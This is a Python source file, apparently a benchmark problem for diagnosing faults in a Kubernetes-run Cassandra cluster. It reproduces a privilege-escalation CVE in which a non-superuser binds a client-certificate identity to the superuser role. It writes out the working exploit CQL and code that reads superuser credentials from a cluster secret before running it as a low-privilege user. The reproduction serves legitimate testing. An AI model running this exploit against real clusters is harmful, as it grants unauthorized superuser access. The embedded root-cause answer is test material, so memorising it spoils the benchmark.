"""CASSANDRA-21219: Disallow binding an identity to a superuser when the user is a regular user.

CVE-2026-27314 — privilege escalation.
JIRA: https://issues.apache.org/jira/browse/CASSANDRA-21219
Buggy: 5.0.6  ->  Fixed: 5.0.7 (released 2026-03-18).

Reproduction summary (from the evidence log):
  On a cluster with auth enabled, a regular (non-superuser) role that holds only the
  CREATE permission can run `ADD IDENTITY '<spiffe-id>' TO ROLE cassandra;` and
  successfully bind its own client-cert identity to the SUPERUSER role `cassandra`. A
  client later presenting that identity over mTLS authenticates as the superuser — full
  privilege escalation. The buggy AddIdentityStatement.authorize() only checks
  Permission.CREATE on the caller's OWN primary role (which every CREATE-granted user
  trivially holds) and execute() then calls addIdentity(identity, role) with no
  superuser guard.

VERBATIM BUGGY SIGNATURE (from the evidence log):
  As regular user bob (CREATE-only, is_superuser=False):
    $ cqlsh -u bob -p bob -e "ADD IDENTITY 'spiffe://repro/bob' TO ROLE cassandra;"
       <no output>            <-- SUCCEEDED (silent success, rc=0)
  Resulting binding in system_auth.identity_to_role (read back as superuser cassandra):
     identity           | role
    --------------------+-----------
     spiffe://repro/bob | cassandra
    (1 rows)
  i.e. a non-superuser (bob, CREATE-only) successfully bound the client-cert identity
  `spiffe://repro/bob` to the SUPERUSER role `cassandra`.

  Fixed-version (5.0.7) control rejects the identical command:
    <stdin>:1:Unauthorized: Error from server: code=2100 [Unauthorized] message=
        "Only superusers can bind identities to a role with superuser status"
  and creates NO binding (identity_to_role: 0 rows).

Why a custom inject_fault() (not a plain `reproducer` CQL string):
  Faithful reproduction is multi-identity — the setup (CREATE ROLE bob + GRANT CREATE)
  and the verification (read system_auth.identity_to_role) run AS the superuser
  `cassandra`, but the EXPLOIT must run AS the non-superuser `bob` (`cqlsh -u bob -p bob`).
  The bug is precisely that bob (a non-superuser) SUCCEEDS: run as the default superuser,
  `ADD IDENTITY ... TO ROLE cassandra` succeeds on BOTH the buggy and the fixed build, so
  a single-credential CQL would not discriminate buggy from fixed. The generic CQL
  reproducer path (db_build_spec._cassandra_run_reproducer) connects with a single
  unauthenticated cqlsh and cannot switch identities, so inject_fault() is overridden to
  read the K8ssandra superuser secret, provision bob, then run the exploit as bob.

  Note on the authorizer: the fix's discriminating gate keys on the ROLE's superuser
  flag (DatabaseDescriptor.getRoleManager().isSuper(role)), not on a grantable
  permission. So the exploit discriminates buggy-vs-fixed under either CassandraAuthorizer
  or AllowAllAuthorizer: fixed 5.0.7 blocks bob (SUPERUSER=false) regardless, buggy 5.0.6
  lets bob through once authenticated. The GRANT statements are therefore best-effort
  (they may be rejected under AllowAllAuthorizer) and run per-statement, swallowing
  failures.

Diagnosis-only: continuous_reproducer is False and expected_output is unset because the
shared continuous-reproducer pod connects with an unauthenticated cqlsh (no `-u/-p`) and
cannot authenticate against this auth-enabled cluster, let alone run as bob. inject_fault()
leaves the buggy `spiffe://repro/bob -> cassandra` binding in system_auth.identity_to_role
for the diagnosis judge.
"""

import base64 as _b64
import logging
import subprocess

from sregym.conductor.problems.generic_custom_build import GenericCustomBuildProblem
from sregym.utils.decorators import mark_fault_injected

logger = logging.getLogger(__name__)


class AutoCassandra21219(GenericCustomBuildProblem):
    db_name = "cassandra"
    db_version = "5.0.6"
    source_git_ref = "cassandra-5.0.6"
    # 5.0.6 already ships the bug (= fixed patch 5.0.7 minus 1), so deploy the stock
    # image instead of a ~30-min ant-jar source build.
    prebuilt_from_stock = True

    root_cause_file = "src/java/org/apache/cassandra/cql3/statements/AddIdentityStatement.java"
    root_cause_description = (
        "Privilege escalation (CVE-2026-27314): AddIdentityStatement.authorize() in 5.0.6 only "
        "checks Permission.CREATE on the caller's OWN primary role (a permission every CREATE-granted "
        "regular user trivially holds) and execute() then calls "
        "DatabaseDescriptor.getRoleManager().addIdentity(identity, role) with no superuser guard. A "
        "non-superuser with CREATE can therefore bind its client-cert identity to a superuser role "
        "(e.g. ADD IDENTITY 'spiffe://repro/bob' TO ROLE cassandra) and, via mTLS/MutualTlsAuthenticator, "
        "later authenticate as that superuser. The fix raises the bar to CREATE on RoleResource.root() "
        "and explicitly rejects a non-superuser binding an identity to a superuser role "
        "('Only superusers can bind identities to a role with superuser status')."
    )

    # Diagnosis-only: see module docstring for why continuous_reproducer/expected_output
    # are not set (the shared continuous-reproducer pod cannot authenticate, and the bug
    # needs a non-superuser identity).
    continuous_reproducer = False

    # The role bound for the escalation, the cert identity, and the target superuser role.
    _BOB = "bob"
    _BOB_PW = "bob"
    _IDENTITY = "spiffe://repro/bob"
    _TARGET_SUPERUSER_ROLE = "cassandra"

    # [1] AS the superuser: provision a non-superuser holding only CREATE. The GRANTs are
    #     best-effort (no-ops / rejected under AllowAllAuthorizer); failures are swallowed.
    _SETUP_AS_SUPERUSER = (
        "CREATE ROLE IF NOT EXISTS bob WITH PASSWORD = 'bob' AND LOGIN = true AND SUPERUSER = false;\n"
        "GRANT CREATE ON ALL ROLES TO bob;\n"
        "GRANT CREATE ON ALL KEYSPACES TO bob;\n"
    )
    # [2] AS non-superuser bob: the exploit. Buggy 5.0.6 -> silent success; fixed 5.0.7 ->
    #     Unauthorized code=2100 "Only superusers can bind identities to a role with superuser status".
    _EXPLOIT_AS_BOB = "ADD IDENTITY 'spiffe://repro/bob' TO ROLE cassandra;"
    # [3] AS the superuser: read back the (buggy) binding so the diagnosis judge can see it.
    #     Buggy 5.0.6 -> 1 row spiffe://repro/bob | cassandra; fixed 5.0.7 -> 0 rows.
    _VERIFY_AS_SUPERUSER = "SELECT identity, role FROM system_auth.identity_to_role;"

    # Human-readable reproducer string (mirrors the verbatim evidence-log steps). The real
    # multi-identity execution happens in inject_fault() below.
    reproducer = """
-- Multi-identity reproduction (executed by inject_fault, not the generic CQL path).
-- [1] AS SUPERUSER cassandra: provision a non-superuser with only CREATE.
CREATE ROLE IF NOT EXISTS bob WITH PASSWORD = 'bob' AND LOGIN = true AND SUPERUSER = false;
GRANT CREATE ON ALL ROLES TO bob;
GRANT CREATE ON ALL KEYSPACES TO bob;
-- [2] AS NON-SUPERUSER bob (cqlsh -u bob -p bob): the exploit.
--     buggy 5.0.6 -> silent success (rc=0);
--     fixed 5.0.7 -> Unauthorized code=2100 "Only superusers can bind identities to a role with superuser status".
ADD IDENTITY 'spiffe://repro/bob' TO ROLE cassandra;
-- [3] AS SUPERUSER cassandra: verify the (buggy) binding exists.
--     buggy 5.0.6 -> 1 row: spiffe://repro/bob | cassandra;  fixed 5.0.7 -> 0 rows.
SELECT identity, role FROM system_auth.identity_to_role;
"""

    # ── Helpers (GenericDBApplication has no run_cql; mirror cassandra.py's secret-read +
    #    kubectl-exec cqlsh pattern, but allow an explicit -u/-p so we can run as bob.) ──

    def _cass_pod(self) -> str:
        """Return a Cassandra pod name in the cluster namespace."""
        out = (
            subprocess.run(
                f"kubectl get pods -n {self.namespace} -l app.kubernetes.io/name=cassandra "
                f"-o jsonpath='{{.items[0].metadata.name}}'",
                shell=True,
                capture_output=True,
                text=True,
            )
            .stdout.strip()
            .strip("'")
        )
        if not out:
            raise RuntimeError(f"No Cassandra pods found in namespace '{self.namespace}'")
        return out

    def _superuser_credentials(self) -> tuple[str, str]:
        """Read the K8ssandra-managed superuser credentials from the cluster secret."""
        secret = f"{self.app.cluster_name}-superuser"
        u = subprocess.run(
            f"kubectl get secret {secret} -n {self.namespace} -o jsonpath='{{.data.username}}'",
            shell=True,
            capture_output=True,
            text=True,
        ).stdout.strip()
        p = subprocess.run(
            f"kubectl get secret {secret} -n {self.namespace} -o jsonpath='{{.data.password}}'",
            shell=True,
            capture_output=True,
            text=True,
        ).stdout.strip()
        return _b64.b64decode(u).decode(), _b64.b64decode(p).decode()

    def _run_cql_as(self, cql: str, username: str, password: str, *, pod: str | None = None):
        """Pipe CQL into cqlsh authenticated as (username, password) via kubectl exec.

        Credentials are base64-encoded before embedding so special characters never
        break shell quoting (same trick as cassandra.py / cassandra_20108).
        Returns the CompletedProcess; callers decide how to treat non-zero exit codes.
        """
        pod = pod or self._cass_pod()
        u_b64 = _b64.b64encode(username.encode()).decode()
        p_b64 = _b64.b64encode(password.encode()).decode()
        cmd = (
            f"kubectl exec -i -n {self.namespace} {pod} -c cassandra -- "
            f"bash -c '"
            f"U=$(echo {u_b64} | base64 -d); "
            f"P=$(echo {p_b64} | base64 -d); "
            f'cqlsh -u "$U" -p "$P" --request-timeout=30'
            f"'"
        )
        return subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            input=cql,
        )

    # ── Fault injection ───────────────────────────────────────────────────────

    @mark_fault_injected
    def inject_fault(self):
        """Swap to the buggy image, then run the multi-identity privilege-escalation repro.

        Steps (faithful to the evidence log):
          1. AS superuser: provision non-superuser `bob` with only CREATE (GRANTs best-effort).
          2. AS bob: run `ADD IDENTITY 'spiffe://repro/bob' TO ROLE cassandra;`
             — buggy 5.0.6 succeeds silently; fixed 5.0.7 returns Unauthorized.
          3. AS superuser: read back system_auth.identity_to_role, leaving the buggy
             `spiffe://repro/bob -> cassandra` binding for the diagnosis judge.
        """
        # Swap the running cluster to the buggy image (mirror the base-class behavior).
        if getattr(self, "_predeployed_buggy", False):
            logger.info("[AutoCassandra21219] Buggy image already deployed — skipping swap")
        else:
            logger.info(f"[AutoCassandra21219] Swapping cluster to buggy image: {self._custom_image}")
            self.app.inject_buggy_image(self._custom_image)
        self.setup_preconditions()

        pod = self._cass_pod()
        su_user, su_pw = self._superuser_credentials()

        # [1] Provision bob as the superuser. Run per-statement so a GRANT rejected under
        #     AllowAllAuthorizer does not abort the rest of the setup.
        logger.info("[AutoCassandra21219] Provisioning non-superuser 'bob' (as superuser)")
        for stmt in (s.strip() for s in self._SETUP_AS_SUPERUSER.split(";")):
            if not stmt:
                continue
            r = self._run_cql_as(stmt + ";", su_user, su_pw, pod=pod)
            if r.returncode != 0:
                logger.info(
                    f"[AutoCassandra21219] setup stmt non-zero (tolerated): {stmt[:60]!r} -> {r.stderr.strip()[:200]}"
                )

        # [2] The exploit, AS non-superuser bob.
        logger.info("[AutoCassandra21219] Running exploit as non-superuser bob: %s", self._EXPLOIT_AS_BOB)
        exploit = self._run_cql_as(self._EXPLOIT_AS_BOB, self._BOB, self._BOB_PW, pod=pod)
        if exploit.returncode == 0:
            logger.info(
                "[AutoCassandra21219] BUGGY SIGNATURE: ADD IDENTITY by non-superuser bob "
                "SUCCEEDED (privilege escalation) — %s -> %s",
                self._IDENTITY,
                self._TARGET_SUPERUSER_ROLE,
            )
        else:
            logger.info(
                "[AutoCassandra21219] ADD IDENTITY by bob rejected (expected on fixed 5.0.7): %s",
                exploit.stderr.strip()[:300],
            )

        # [3] Read back the binding as the superuser (leaves the buggy row visible).
        logger.info("[AutoCassandra21219] Reading system_auth.identity_to_role (as superuser)")
        verify = self._run_cql_as(self._VERIFY_AS_SUPERUSER, su_user, su_pw, pod=pod)
        logger.info("[AutoCassandra21219] identity_to_role:\n%s", verify.stdout.strip()[:500])
